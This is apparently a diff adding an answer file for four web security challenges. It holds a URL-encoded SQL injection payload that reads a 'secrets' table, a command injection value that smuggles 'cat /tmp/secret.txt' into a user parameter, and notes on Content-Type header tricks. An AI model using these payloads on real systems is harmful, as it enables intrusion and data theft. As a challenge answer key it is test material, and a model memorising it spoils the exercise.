@@ -1,0 +1,19 @@
+Challenge 1:
+
+challenge1/start.php?amount=50&currency=%27+%0Aunion+select+*+from+secrets+%23
+
+
+Challenge 2:
+
+challenge2/12076336-a10a-11eb-bcbc-0242ac130002.php?user=sdkfj+%27|%20lol%20|%20+cat+/tmp/secret.txt%27
+
+
+Challenge 3:
+
+Two Content-Type Headers (first: x-www-form-urlencoded, second: None)
+
+Send Form as x-www-form-urlencoded
+
+Challenge 4:
+
+Send Form as multipart/form-data ( & in that format)
